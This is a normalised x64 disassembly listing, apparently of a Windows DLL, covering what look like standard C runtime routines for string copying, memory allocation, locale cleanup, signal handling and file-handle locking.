mov edx [ rbp - 0x58 ]
test edx edx
je r-xdata
mov eax 0x8000
test eax r13d
jne r-xdata
test rbx rbx
cmove rbx [ rw-data ]
mov rcx rbx
jmp r-xdata
test rbx rbx
mov [ rsp + 0x54 ] 0x1
cmove rbx [ rw-data ]
mov rcx rbx
jmp r-xdata
mov r9d 0xa
cmp eax 0x78
jne r-xdata
mov [ rbx ] al
dec rbx
jmp r-xdata
add eax esi
mov esi [ rsp + 0x40 ]
lea rax [ rbp + 0x1bf ]
mov [ rsp + 0x44 ] edi
sub eax ebx
inc rbx
mov [ rsp + 0x48 ] eax
test r11d r13d
je r-xdata
mov rax [ r15 ]
add r15 0x8
test rax rax
je r-xdata
cmp eax 0x61
je r-xdata
test esi esi
js r-xdata
mov r8 [ rsp + 0x70 ]
lea r9 [ rsp + 0x40 ]
lea rcx [ rbp + 0x1c0 ]
call sub_18001404c
xor r10d r10d
test edi edi
jne r-xdata
test eax eax
jne r-xdata
test eax eax
jne r-xdata
mov eax 0x27
jmp r-xdata
mov ecx edi
dec edi
test ecx ecx
jg r-xdata
test eax eax
je r-xdata
mov rbx [ rw-data ]
mov rcx rbx
call sub_1800112a0
jmp r-xdata
mov rbx [ rax + 0x8 ]
test rbx rbx
je r-xdata
cmp eax 0x63
je r-xdata
movzx r9d [ rsi ]
lea rdx [ rbp + 0x1c0 ]
lea rcx [ rbp - 0x58 ]
mov r8d 0x6
dec edi
add rsi 0x2
call sub_180013fe4
xor r10d r10d
test eax eax
jne r-xdata
jmp r-xdata
dec eax
cmp [ rcx ] r10b
je r-xdata
sub ecx ebx
dec eax
cmp [ rcx ] r10w
je r-xdata
sub rcx rbx
sar rcx 0x1
jmp r-xdata
mov [ rsp + 0x64 ] eax
mov r9d 0x10
test r13b r13b
jns r-xdata
dec rbx
inc [ rsp + 0x48 ]
mov [ rbx ] 0x30
jmp r-xdata
cmp [ rbx ] 0x30
je r-xdata
xor r10d r10d
movsx eax [ rax ]
bt r13d 0xb
jae r-xdata
jmp r-xdata
mov esi [ rsp + 0x40 ]
inc rcx
add rcx 0x2
mov [ rsp + 0x48 ] ecx
jmp r-xdata
mov [ rsp + 0x54 ] r10d
jmp r-xdata
cdq
mov [ rsp + 0x54 ] 0x1
sub eax edx
sar eax 0x1
jmp r-xdata
mov [ rsp + 0x48 ] eax
sub_180014bd0
mov [ rsp + 0x10 ] rbx
mov [ rsp + 0x18 ] rsi
push rdi
push r12
push r13
push r14
push r15
sub rsp 0x30
mov ebx ecx
xor edi edi
mov [ rsp + 0x60 ] edi
xor esi esi
mov edx ecx
sub edx 0x2
je r-xdata
lea r12 [ rw-data ]
mov rcx [ rw-data ]
sub edx 0x2
je r-xdata
test r13 r13
jne r-xdata
xor eax eax
jmp r-xdata
call sub_18000f48c
mov rsi rax
test rax rax
jne r-xdata
sub edx 0x2
je r-xdata
test edi edi
je r-xdata
lea ecx [ r13 + 0x3 ]
call sub_18000f070
int3
mov rbx [ rsp + 0x68 ]
mov rsi [ rsp + 0x70 ]
add rsp 0x30
pop r15
pop r14
pop r13
pop r12
pop rdi
retn
mov rdx [ rax + 0xa0 ]
mov rcx rdx
movsxd r8 [ r--data ]
or eax 0xffffffff
jmp r-xdata
lea r12 [ rw-data ]
mov rcx [ rw-data ]
jmp r-xdata
sub edx 0x2
je r-xdata
cmp ebx 0x8
je r-xdata
xor ecx ecx
call sub_180012fa4
nop
mov rax r8
shl rax 0x4
add rax rdx
cmp rcx rax
jae r-xdata
add rcx 0x10
mov rax r8
shl rax 0x4
add rax rdx
cmp rcx rax
jb r-xdata
mov edi 0x1
mov [ rsp + 0x60 ] edi
call [ DecodePointer@IAT ]
mov r13 rax
sub edx 0x3
je r-xdata
mov r15 [ rsi + 0xa8 ]
mov [ rsp + 0x28 ] r15
and [ rsi + 0xa8 ] 0x0
cmp ebx 0x8
jne r-xdata
cmp ebx 0xb
je r-xdata
xor ecx ecx
cmp [ rcx + 0x4 ] ebx
je r-xdata
cmp [ rcx + 0x4 ] ebx
je r-xdata
sub edx 0x4
je r-xdata
mov r14d [ rsp + 0x60 ]
mov r14d [ rsi + 0xb0 ]
mov [ rsi + 0xb0 ] 0x8c
jmp r-xdata
cmp ebx 0x4
je r-xdata
cmp r13 0x1
jne r-xdata
lea r12 [ rcx + 0x8 ]
mov r13 [ r12 ]
jmp r-xdata
lea r12 [ rw-data ]
mov rcx [ rw-data ]
jmp r-xdata
sub edx 0x6
je r-xdata
call EncodePointer
mov [ r12 ] rax
mov ecx [ r--data ]
mov edx ecx
mov [ rsp + 0x20 ] ecx
cmp ebx 0x8
jne r-xdata
mov r15 [ rsp + 0x28 ]
jmp r-xdata
lea r12 [ rw-data ]
mov rcx [ rw-data ]
jmp r-xdata
dec edx
je r-xdata
mov edi 0x8
cmp ebx edi
jne r-xdata
xor ecx ecx
call sub_180012ea4
test edi edi
je r-xdata
movsxd rcx edx
add rcx rcx
mov rax [ rsi + 0xa0 ]
and [ rax + rcx * 8 + 0x8 ] 0x0
inc edx
mov [ rsp + 0x20 ] edx
mov ecx [ r--data ]
jmp r-xdata
call sub_18000ea3c
mov [ rax ] 0x16
call sub_18000e9d4
jmp r-xdata
mov ecx ebx
call r13
mov edx [ rsi + 0xb0 ]
mov ecx edi
call r13
jmp r-xdata
mov eax [ r--data ]
add ecx eax
cmp edx ecx
jge r-xdata
mov [ rsi + 0xa8 ] r15
cmp ebx edi
jne r-xdata
cmp ebx 0xb
je r-xdata
cmp ebx edi
je r-xdata
mov [ rsi + 0xb0 ] r14d
jmp r-xdata
cmp ebx 0x4
jne r-xdata
sub_180014e14
push rbx
push rbp
push rsi
push rdi
push r12
push r13
push r14
sub rsp 0x50
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x48 ] rax
mov ebp r8d
mov r14 rdx
mov r13 rcx
call EncodePointer
xor ebx ebx
cmp [ rw-data ] rbx
mov rdi rax
jne r-xdata
mov rax [ rw-data ]
lea rcx [ r--data ]
call [ LoadLibraryW@IAT ]
mov rsi rax
test rax rax
je r-xdata
mov rcx [ rw-data ]
cmp rcx rdi
je r-xdata
cmp r11 rdi
je r-xdata
xor eax eax
lea rdx [ r--data ]
mov rcx rax
call [ GetProcAddress@IAT ]
test rax rax
je r-xdata
mov rcx [ rw-data ]
call [ DecodePointer@IAT ]
test rax rax
je r-xdata
call [ DecodePointer@IAT ]
test rax rax
je r-xdata
mov rcx rax
call [ DecodePointer@IAT ]
mov rcx [ rw-data ]
mov rsi rax
call [ DecodePointer@IAT ]
mov r12 rax
test rsi rsi
je r-xdata
mov rcx rax
call [ EncodePointer@IAT ]
lea rdx [ r--data ]
mov rcx rsi
mov [ rw-data ] rax
call [ GetProcAddress@IAT ]
mov rcx rax
call [ EncodePointer@IAT ]
lea rdx [ r--data ]
mov rcx rsi
mov [ rw-data ] rax
call [ GetProcAddress@IAT ]
mov rcx rax
call [ EncodePointer@IAT ]
lea rdx [ r--data ]
mov rcx rsi
mov [ rw-data ] rax
call [ GetProcAddress@IAT ]
mov rcx rax
call [ EncodePointer@IAT ]
mov r11 rax
mov [ rw-data ] rax
test rax rax
je r-xdata
mov r9d ebp
mov r8 r14
mov rdx r13
mov rcx rbx
call rax
jmp r-xdata
call rax
mov rbx rax
test rax rax
je r-xdata
test rax rax
je r-xdata
mov rax [ rw-data ]
jmp r-xdata
lea rdx [ r--data ]
mov rcx rsi
call [ GetProcAddress@IAT ]
mov rcx rax
call [ EncodePointer@IAT ]
mov [ rw-data ] rax
jmp r-xdata
mov rcx [ rsp + 0x48 ]
xor rcx rsp
call sub_18000c060
add rsp 0x50
pop r14
pop r13
pop r12
pop rdi
pop rsi
pop rbp
pop rbx
retn
mov rcx [ rw-data ]
cmp rcx rdi
je r-xdata
call rsi
test rax rax
je r-xdata
cmp rax rdi
je r-xdata
mov r11 [ rw-data ]
call [ DecodePointer@IAT ]
test rax rax
je r-xdata
bts ebp 0x15
jmp r-xdata
lea rcx [ rsp + 0x30 ]
mov r9d 0xc
lea r8 [ rsp + 0x38 ]
mov [ rsp + 0x20 ] rcx
lea edx [ r9 - 0xb ]
mov rcx rax
call r12
test eax eax
je r-xdata
mov rcx rbx
call rax
mov rbx rax
test [ rsp + 0x40 ] 0x1
jne r-xdata
sub_18001501c
push rbx
sub rsp 0x20
xor r10d r10d
mov r9 rcx
test rcx rcx
je r-xdata
call sub_18000ea3c
mov ebx 0x16
test rdx rdx
je r-xdata
test r8 r8
jne r-xdata
cmp [ rcx ] r10w
je r-xdata
mov [ rcx ] r10w
test rdx rdx
jne r-xdata
add rcx 0x2
dec rdx
jne r-xdata
sub rcx r8
mov [ r9 ] r10w
jmp r-xdata
test rdx rdx
jne r-xdata
dec rdx
jne r-xdata
xor eax eax
jmp r-xdata
mov [ r9 ] r10w
call sub_18000ea3c
mov ebx 0x22
jmp r-xdata
movzx eax [ r8 ]
mov [ rcx + r8 ] ax
add r8 0x2
test ax ax
je r-xdata
add rsp 0x20
pop rbx
retn
mov [ rax ] ebx
call sub_18000e9d4
mov eax ebx
sub_1800150a4
push rbx
sub rsp 0x20
xor ebx ebx
mov r10 r8
test r9 r9
jne r-xdata
test rcx rcx
je r-xdata
test rcx rcx
jne r-xdata
call sub_18000ea3c
mov ebx 0x16
test rdx rdx
je r-xdata
test rdx rdx
jne r-xdata
test r9 r9
jne r-xdata
xor eax eax
jmp r-xdata
test r8 r8
jne r-xdata
mov [ rcx ] bx
jmp r-xdata
add rsp 0x20
pop rbx
retn
mov r11 rcx
mov r8 rdx
cmp r9 0xffffffffffffffff
jne r-xdata
mov [ rcx ] bx
sub r10 rcx
sub r11 r10
test r9 r9
jne r-xdata
dec r8
je r-xdata
test r8 r8
jne r-xdata
dec r8
jne r-xdata
mov [ r11 ] bx
dec r9
jne r-xdata
cmp r9 0xffffffffffffffff
jne r-xdata
movzx eax [ r10 ]
mov [ r11 + r10 ] ax
add r10 0x2
test ax ax
je r-xdata
jmp r-xdata
movzx eax [ r10 + r11 ]
mov [ r11 ] ax
add r11 0x2
test ax ax
je r-xdata
mov [ rcx ] bx
call sub_18000ea3c
mov ebx 0x22
jmp r-xdata
mov [ rcx + rdx * 2 - 0x2 ] bx
lea eax [ r8 + 0x50 ]
jmp r-xdata
mov [ rax ] ebx
call sub_18000e9d4
mov eax ebx
sub_180015190
push rbx
sub rsp 0x20
xor r10d r10d
mov r9 rcx
test rcx rcx
je r-xdata
call sub_18000ea3c
mov ebx 0x16
test rdx rdx
je r-xdata
test r8 r8
jne r-xdata
sub rcx r8
mov [ rcx ] r10w
test rdx rdx
jne r-xdata
dec rdx
jne r-xdata
xor eax eax
jmp r-xdata
mov [ r9 ] r10w
call sub_18000ea3c
mov ebx 0x22
jmp r-xdata
movzx eax [ r8 ]
mov [ rcx + r8 ] ax
add r8 0x2
test ax ax
je r-xdata
add rsp 0x20
pop rbx
retn
mov [ rax ] ebx
call sub_18000e9d4
mov eax ebx
sub_1800151fc
sub rsp 0x28
test ecx ecx
js r-xdata
call sub_18000ea3c
mov [ rax ] 0x16
call sub_18000e9d4
or eax 0xffffffff
cmp ecx 0x2
jle r-xdata
mov eax [ rw-data ]
mov [ rw-data ] ecx
jmp r-xdata
cmp ecx 0x3
jne r-xdata
add rsp 0x28
retn
mov eax [ rw-data ]
jmp r-xdata
sub_18001523c
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
mov rbx r8
mov rdi rdx
test rcx rcx
je r-xdata
imul rdi rcx
mov eax 0x1
test rdi rdi
cmove rdi rax
xor edx edx
lea rax [ rdx - 0x20 ]
div rcx
cmp rax rdi
jae r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov rcx [ rw-data ]
lea edx [ rax + 0x8 ]
mov r8 rdi
call [ HeapAlloc@IAT ]
test rax rax
jne r-xdata
call sub_18000ea3c
mov [ rax ] 0xc
test rbx rbx
je r-xdata
mov rcx rdi
call sub_18000ec64
test eax eax
jne r-xdata
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
mov [ rbx ] 0xc
xor eax eax
cmp rdi 0xffffffffffffffe0
ja r-xdata
test rbx rbx
je r-xdata
xor eax eax
jmp r-xdata
mov [ rbx ] 0xc
jmp r-xdata
sub_1800152d8
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
push rdi
sub rsp 0x40
mov ebx edx
mov rdx rcx
lea rcx [ rsp + 0x20 ]
mov edi r9d
mov esi r8d
call sub_18000cd7c
mov rax [ rsp + 0x28 ]
movzx r11d bl
test [ r11 + rax + 0x1d ] dil
jne r-xdata
mov eax 0x1
test esi esi
je r-xdata
mov rbx [ rsp + 0x50 ]
mov rsi [ rsp + 0x58 ]
add rsp 0x40
pop rdi
retn
mov rcx [ rsp + 0x30 ]
and [ rcx + 0xc8 ] 0xfffffffd
xor eax eax
mov rax [ rsp + 0x20 ]
mov rcx [ rax + 0x140 ]
movzx eax [ rcx + r11 * 2 ]
and eax esi
jmp r-xdata
cmp [ rsp + 0x38 ] 0x0
je r-xdata
test eax eax
je r-xdata
sub_180015368
sub rsp 0x28
test rcx rcx
jne r-xdata
mov r8 rcx
mov rcx [ rw-data ]
xor edx edx
add rsp 0x28
jmp [ HeapSize@IAT ]
call sub_18000ea3c
mov [ rax ] 0x16
call sub_18000e9d4
or rax 0xffffffffffffffff
add rsp 0x28
retn
sub_1800153a4
push rbp
push r12
push r13
push r14
push r15
sub rsp 0x40
lea rbp [ rsp + 0x30 ]
mov [ rbp + 0x40 ] rbx
mov [ rbp + 0x48 ] rsi
mov [ rbp + 0x50 ] rdi
mov rax [ rw-data ]
xor rax rbp
mov [ rbp ] rax
mov esi [ rbp + 0x68 ]
xor edi edi
mov r13d r9d
mov r14 r8
mov r15d edx
test esi esi
jne r-xdata
neg [ rbp + 0x70 ]
mov ecx esi
mov [ rsp + 0x28 ] edi
sbb edx edx
mov [ rsp + 0x20 ] rdi
and edx 0x8
inc edx
call [ MultiByteToWideChar@IAT ]
movsxd r12 eax
test eax eax
jne r-xdata
mov rax [ rcx ]
mov esi [ rax + 0x4 ]
jle r-xdata
xor eax eax
jmp r-xdata
mov rbx rdi
mov rax 0x7ffffffffffffff0
cmp r12 rax
ja r-xdata
mov rcx [ rbp ]
xor rcx rbp
call sub_18000c060
mov rbx [ rbp + 0x40 ]
mov rsi [ rbp + 0x48 ]
mov rdi [ rbp + 0x50 ]
lea rsp [ rbp + 0x10 ]
pop r15
pop r14
pop r13
pop r12
pop rbp
retn
mov r8 r12
xor edx edx
mov rcx rbx
add r8 r8
call sub_18000bd10
mov r9d r13d
mov r8 r14
mov edx 0x1
mov ecx esi
mov [ rsp + 0x28 ] r12d
mov [ rsp + 0x20 ] rbx
call [ MultiByteToWideChar@IAT ]
test eax eax
je r-xdata
lea rcx [ r12 + r12 + 0x10 ]
cmp rcx 0x400
ja r-xdata
lea rcx [ rbx - 0x10 ]
cmp [ rcx ] 0xdddd
jne r-xdata
mov r9 [ rbp + 0x60 ]
mov r8d eax
mov rdx rbx
mov ecx r15d
call [ GetStringTypeW@IAT ]
mov edi eax
call sub_18000c27c
mov rbx rax
test rax rax
je r-xdata
lea rax [ rcx + 0xf ]
cmp rax rcx
ja r-xdata
mov eax edi
call sub_18000ec1c
test rbx rbx
je r-xdata
mov [ rax ] 0xdddd
and rax 0xfffffffffffffff0
call sub_18000d8d0
sub rsp rax
lea rbx [ rsp + 0x30 ]
test rbx rbx
je r-xdata
mov rax 0xffffffffffffff0
mov [ rbx ] 0xcccc
jmp r-xdata
add rbx 0x10
jmp r-xdata
sub_180015504
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
push rdi
sub rsp 0x60
mov esi edx
mov rdx rcx
lea rcx [ rsp + 0x40 ]
mov ebx r9d
mov rdi r8
call sub_18000cd7c
mov r11d [ rsp + 0xa8 ]
mov eax [ rsp + 0x98 ]
lea rcx [ rsp + 0x40 ]
mov [ rsp + 0x30 ] r11d
mov [ rsp + 0x28 ] eax
mov rax [ rsp + 0x90 ]
mov r9d ebx
mov r8 rdi
mov edx esi
mov [ rsp + 0x20 ] rax
call sub_1800153a4
cmp [ rsp + 0x58 ] 0x0
je r-xdata
mov rbx [ rsp + 0x70 ]
mov rsi [ rsp + 0x78 ]
add rsp 0x60
pop rdi
retn
mov rcx [ rsp + 0x50 ]
and [ rcx + 0xc8 ] 0xfffffffd
sub_180015584
test rcx rcx
je r-xdata
retn
push rbx
sub rsp 0x20
mov rbx rcx
mov rcx [ rcx + 0x8 ]
call sub_18000ec1c
mov rcx [ rbx + 0x10 ]
call sub_18000ec1c
mov rcx [ rbx + 0x18 ]
call sub_18000ec1c
mov rcx [ rbx + 0x20 ]
call sub_18000ec1c
mov rcx [ rbx + 0x28 ]
call sub_18000ec1c
mov rcx [ rbx + 0x30 ]
call sub_18000ec1c
mov rcx [ rbx ]
call sub_18000ec1c
mov rcx [ rbx + 0x40 ]
call sub_18000ec1c
mov rcx [ rbx + 0x48 ]
call sub_18000ec1c
mov rcx [ rbx + 0x50 ]
call sub_18000ec1c
mov rcx [ rbx + 0x58 ]
call sub_18000ec1c
mov rcx [ rbx + 0x60 ]
call sub_18000ec1c
mov rcx [ rbx + 0x68 ]
call sub_18000ec1c
mov rcx [ rbx + 0x38 ]
call sub_18000ec1c
mov rcx [ rbx + 0x70 ]
call sub_18000ec1c
mov rcx [ rbx + 0x78 ]
call sub_18000ec1c
mov rcx [ rbx + 0x80 ]
call sub_18000ec1c
mov rcx [ rbx + 0x88 ]
call sub_18000ec1c
mov rcx [ rbx + 0x90 ]
call sub_18000ec1c
mov rcx [ rbx + 0x98 ]
call sub_18000ec1c
mov rcx [ rbx + 0xa0 ]
call sub_18000ec1c
mov rcx [ rbx + 0xa8 ]
call sub_18000ec1c
mov rcx [ rbx + 0xb0 ]
call sub_18000ec1c
mov rcx [ rbx + 0xb8 ]
call sub_18000ec1c
mov rcx [ rbx + 0xc0 ]
call sub_18000ec1c
mov rcx [ rbx + 0xc8 ]
call sub_18000ec1c
mov rcx [ rbx + 0xd0 ]
call sub_18000ec1c
mov rcx [ rbx + 0xd8 ]
call sub_18000ec1c
mov rcx [ rbx + 0xe0 ]
call sub_18000ec1c
mov rcx [ rbx + 0xe8 ]
call sub_18000ec1c
mov rcx [ rbx + 0xf0 ]
call sub_18000ec1c
mov rcx [ rbx + 0xf8 ]
call sub_18000ec1c
mov rcx [ rbx + 0x100 ]
call sub_18000ec1c
mov rcx [ rbx + 0x108 ]
call sub_18000ec1c
mov rcx [ rbx + 0x110 ]
call sub_18000ec1c
mov rcx [ rbx + 0x118 ]
call sub_18000ec1c
mov rcx [ rbx + 0x120 ]
call sub_18000ec1c
mov rcx [ rbx + 0x128 ]
call sub_18000ec1c
mov rcx [ rbx + 0x130 ]
call sub_18000ec1c
mov rcx [ rbx + 0x138 ]
call sub_18000ec1c
mov rcx [ rbx + 0x140 ]
call sub_18000ec1c
mov rcx [ rbx + 0x148 ]
call sub_18000ec1c
mov rcx [ rbx + 0x150 ]
call sub_18000ec1c
mov rcx [ rbx + 0x170 ]
call sub_18000ec1c
mov rcx [ rbx + 0x178 ]
call sub_18000ec1c
mov rcx [ rbx + 0x180 ]
call sub_18000ec1c
mov rcx [ rbx + 0x188 ]
call sub_18000ec1c
mov rcx [ rbx + 0x190 ]
call sub_18000ec1c
mov rcx [ rbx + 0x198 ]
call sub_18000ec1c
mov rcx [ rbx + 0x168 ]
call sub_18000ec1c
mov rcx [ rbx + 0x1a8 ]
call sub_18000ec1c
mov rcx [ rbx + 0x1b0 ]
call sub_18000ec1c
mov rcx [ rbx + 0x1b8 ]
call sub_18000ec1c
mov rcx [ rbx + 0x1c0 ]
call sub_18000ec1c
mov rcx [ rbx + 0x1c8 ]
call sub_18000ec1c
mov rcx [ rbx + 0x1d0 ]
call sub_18000ec1c
mov rcx [ rbx + 0x1a0 ]
call sub_18000ec1c
mov rcx [ rbx + 0x1d8 ]
call sub_18000ec1c
mov rcx [ rbx + 0x1e0 ]
call sub_18000ec1c
mov rcx [ rbx + 0x1e8 ]
call sub_18000ec1c
mov rcx [ rbx + 0x1f0 ]
call sub_18000ec1c
mov rcx [ rbx + 0x1f8 ]
call sub_18000ec1c
mov rcx [ rbx + 0x200 ]
call sub_18000ec1c
mov rcx [ rbx + 0x208 ]
call sub_18000ec1c
mov rcx [ rbx + 0x210 ]
call sub_18000ec1c
mov rcx [ rbx + 0x218 ]
call sub_18000ec1c
mov rcx [ rbx + 0x220 ]
call sub_18000ec1c
mov rcx [ rbx + 0x228 ]
call sub_18000ec1c
mov rcx [ rbx + 0x230 ]
call sub_18000ec1c
mov rcx [ rbx + 0x238 ]
call sub_18000ec1c
mov rcx [ rbx + 0x240 ]
call sub_18000ec1c
mov rcx [ rbx + 0x248 ]
call sub_18000ec1c
mov rcx [ rbx + 0x250 ]
call sub_18000ec1c
mov rcx [ rbx + 0x258 ]
call sub_18000ec1c
mov rcx [ rbx + 0x260 ]
call sub_18000ec1c
mov rcx [ rbx + 0x268 ]
call sub_18000ec1c
mov rcx [ rbx + 0x270 ]
call sub_18000ec1c
mov rcx [ rbx + 0x278 ]
call sub_18000ec1c
mov rcx [ rbx + 0x280 ]
call sub_18000ec1c
mov rcx [ rbx + 0x288 ]
call sub_18000ec1c
mov rcx [ rbx + 0x290 ]
call sub_18000ec1c
mov rcx [ rbx + 0x298 ]
call sub_18000ec1c
mov rcx [ rbx + 0x2a0 ]
call sub_18000ec1c
mov rcx [ rbx + 0x2a8 ]
call sub_18000ec1c
mov rcx [ rbx + 0x2b0 ]
call sub_18000ec1c
mov rcx [ rbx + 0x2b8 ]
call sub_18000ec1c
add rsp 0x20
pop rbx
sub_180015974
test rcx rcx
je r-xdata
retn
push rbx
sub rsp 0x20
mov rbx rcx
mov rcx [ rcx ]
cmp rcx [ rw-data ]
je r-xdata
mov rcx [ rbx + 0x8 ]
cmp rcx [ rw-data ]
je r-xdata
call sub_18000ec1c
mov rcx [ rbx + 0x10 ]
cmp rcx [ rw-data ]
je r-xdata
call sub_18000ec1c
mov rcx [ rbx + 0x58 ]
cmp rcx [ rw-data ]
je r-xdata
call sub_18000ec1c
mov rcx [ rbx + 0x60 ]
cmp rcx [ rw-data ]
je r-xdata
call sub_18000ec1c
add rsp 0x20
pop rbx
call sub_18000ec1c
sub_1800159e0
test rcx rcx
je r-xdata
retn
push rbx
sub rsp 0x20
mov rbx rcx
mov rcx [ rcx + 0x18 ]
cmp rcx [ rw-data ]
je r-xdata
mov rcx [ rbx + 0x20 ]
cmp rcx [ rw-data ]
je r-xdata
call sub_18000ec1c
mov rcx [ rbx + 0x28 ]
cmp rcx [ rw-data ]
je r-xdata
call sub_18000ec1c
mov rcx [ rbx + 0x30 ]
cmp rcx [ rw-data ]
je r-xdata
call sub_18000ec1c
mov rcx [ rbx + 0x38 ]
cmp rcx [ rw-data ]
je r-xdata
call sub_18000ec1c
mov rcx [ rbx + 0x40 ]
cmp rcx [ rw-data ]
je r-xdata
call sub_18000ec1c
mov rcx [ rbx + 0x48 ]
cmp rcx [ rw-data ]
je r-xdata
call sub_18000ec1c
mov rcx [ rbx + 0x68 ]
cmp rcx [ rw-data ]
je r-xdata
call sub_18000ec1c
mov rcx [ rbx + 0x70 ]
cmp rcx [ rw-data ]
je r-xdata
call sub_18000ec1c
mov rcx [ rbx + 0x78 ]
cmp rcx [ rw-data ]
je r-xdata
call sub_18000ec1c
mov rcx [ rbx + 0x80 ]
cmp rcx [ rw-data ]
je r-xdata
call sub_18000ec1c
mov rcx [ rbx + 0x88 ]
cmp rcx [ rw-data ]
je r-xdata
call sub_18000ec1c
mov rcx [ rbx + 0x90 ]
cmp rcx [ rw-data ]
je r-xdata
call sub_18000ec1c
add rsp 0x20
pop rbx
call sub_18000ec1c
sub_180015aec
mov [ rsp + 0x10 ] rdi
mov [ rsp + 0x20 ] r12
push rbp
mov rbp rsp
sub rsp 0x70
movsxd rdi ecx
lea rcx [ rbp - 0x20 ]
call sub_18000cd7c
cmp edi 0x100
jae r-xdata
mov rax [ rbp - 0x20 ]
cmp [ rax + 0x10c ] 0x1
jle r-xdata
mov rdx [ rbp - 0x20 ]
cmp [ rdx + 0x10c ] 0x1
jle r-xdata
call sub_18000ea3c
mov edx 0x1
mov [ rax ] 0x2a
mov [ rbp + 0x10 ] dil
mov [ rbp + 0x11 ] 0x0
mov r12d edi
lea rdx [ rbp - 0x20 ]
sar r12d 0x8
movzx ecx r12b
call sub_180013c94
test eax eax
je r-xdata
mov rax [ rdx + 0x140 ]
movzx eax [ rax + rdi * 2 ]
and eax 0x1
lea r8 [ rbp - 0x20 ]
mov edx 0x1
mov ecx edi
call sub_1800167d0
mov rdx [ rbp - 0x20 ]
jmp r-xdata
cmp [ rbp - 0x8 ] 0x0
je r-xdata
cmp eax 0x1
movzx eax [ rbp + 0x20 ]
je r-xdata
mov [ rbp + 0x10 ] r12b
mov [ rbp + 0x11 ] dil
mov [ rbp + 0x12 ] 0x0
mov edx 0x2
jmp r-xdata
mov rax [ rdx + 0x148 ]
movzx eax [ rax + rdi ]
jmp r-xdata
test eax eax
je r-xdata
mov eax edi
jmp r-xdata
mov rax [ rbp - 0x10 ]
and [ rax + 0xc8 ] 0xfffffffd
cmp [ rbp - 0x8 ] 0x0
je r-xdata
movzx ecx [ rbp + 0x21 ]
shl eax 0x8
or eax ecx
mov rcx [ rbp - 0x20 ]
mov [ rsp + 0x40 ] 0x1
lea r9 [ rbp + 0x10 ]
mov eax [ rcx + 0x4 ]
mov r8d 0x100
mov [ rsp + 0x38 ] eax
lea rax [ rbp + 0x20 ]
mov [ rsp + 0x30 ] 0x3
mov [ rsp + 0x28 ] rax
mov [ rsp + 0x20 ] edx
mov edx [ rcx + 0x14 ]
lea rcx [ rbp - 0x20 ]
call sub_180011614
test eax eax
je r-xdata
lea r11 [ rsp + 0x70 ]
mov rdi [ r11 + 0x18 ]
mov r12 [ r11 + 0x28 ]
mov rsp r11
pop rbp
retn
mov rcx [ rbp - 0x10 ]
and [ rcx + 0xc8 ] 0xfffffffd
sub_180015c50
sub rsp 0x28
mov [ rsp + 0x30 ] rcx
mov [ rsp + 0x38 ] rdx
mov [ rsp + 0x40 ] r8d
mov rdx [ rdx ]
mov rax rcx
call sub_1800105a0
call rax
call sub_1800105d0
mov rcx rax
mov rdx [ rsp + 0x38 ]
mov rdx [ rdx ]
mov r8d 0x2
call sub_1800105a0
add rsp 0x28
retn
sub_180015ca4
sub rsp 0x28
call sub_180014bc0
test rax rax
je r-xdata
test [ rw-data ] 0x2
je r-xdata
mov ecx 0x16
call sub_180014bd0
mov ecx 0x3
call sub_18000f070
int3
mov r8d 0x1
mov edx 0x40000015
lea ecx [ r8 + 0x2 ]
call sub_18000e7e4
sub_180015cf0
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
push rdi
sub rsp 0x20
test ecx ecx
js r-xdata
call sub_18000ea3c
mov [ rax ] 0x9
call sub_18000ea5c
and [ rax ] 0x0
or eax 0xffffffff
cmp ecx [ rw-data ]
jae r-xdata
movsxd rbx ecx
lea rbp [ rw-data ]
mov rdi rbx
and ebx 0x1f
sar rdi 0x5
imul rbx rbx 0x58
mov rax [ rbp + rdi * 8 ]
test [ rax + rbx + 0x8 ] 0x1
je r-xdata
cmp [ rax + rbx ] 0xffffffffffffffff
je r-xdata
cmp [ rw-data ] 0x1
jne r-xdata
mov rax [ rbp + rdi * 8 ]
or [ rbx + rax ] 0xffffffffffffffff
xor eax eax
jmp r-xdata
test ecx ecx
je r-xdata
mov rbx [ rsp + 0x30 ]
mov rbp [ rsp + 0x38 ]
add rsp 0x20
pop rdi
retn
mov ecx 0xfffffff6
dec ecx
je r-xdata
mov ecx 0xfffffff5
jmp r-xdata
dec ecx
jne r-xdata
xor edx edx
call [ SetStdHandle@IAT ]
mov ecx 0xfffffff4
jmp r-xdata
sub_180015d9c
sub rsp 0x28
cmp ecx 0xfffffffe
jne r-xdata
test ecx ecx
js r-xdata
call sub_18000ea5c
and [ rax ] 0x0
call sub_18000ea3c
mov [ rax ] 0x9
jmp r-xdata
call sub_18000ea5c
and [ rax ] 0x0
call sub_18000ea3c
mov [ rax ] 0x9
call sub_18000e9d4
cmp ecx [ rw-data ]
jae r-xdata
or rax 0xffffffffffffffff
movsxd rdx ecx
lea rcx [ rw-data ]
mov rax rdx
and edx 0x1f
sar rax 0x5
imul rdx rdx 0x58
mov rax [ rcx + rax * 8 ]
test [ rax + rdx + 0x8 ] 0x1
je r-xdata
mov rax [ rax + rdx ]
jmp r-xdata
add rsp 0x28
retn
sub_180015e10
mov rax rsp
mov [ rax + 0x8 ] rbx
mov [ rax + 0x10 ] rsi
mov [ rax + 0x18 ] rdi
mov [ rax + 0x20 ] r12
push r14
sub rsp 0x20
movsxd rbx ecx
mov r12 rbx
sar r12 0x5
lea r14 [ rw-data ]
and ebx 0x1f
imul rbx rbx 0x58
mov rsi [ r14 + r12 * 8 ]
mov edi 0x1
cmp [ rbx + rsi + 0xc ] 0x0
jne r-xdata
test edi edi
je r-xdata
lea ecx [ rdi + 0x9 ]
call sub_180012fa4
nop
cmp [ rbx + rsi + 0xc ] 0x0
jne r-xdata
mov eax edi
mov rbx [ rsp + 0x30 ]
mov rsi [ rsp + 0x38 ]
mov rdi [ rsp + 0x40 ]
mov r12 [ rsp + 0x48 ]
add rsp 0x20
pop r14
retn
mov rcx [ r14 + r12 * 8 ]
lea rcx [ rcx + rbx + 0x10 ]
call [ EnterCriticalSection@IAT ]
mov ecx 0xa
call sub_180012ea4
lea rcx [ rbx + rsi + 0x10 ]
mov edx 0xfa0
call [ InitializeCriticalSectionAndSpinCount@IAT ]
neg eax
sbb edx edx
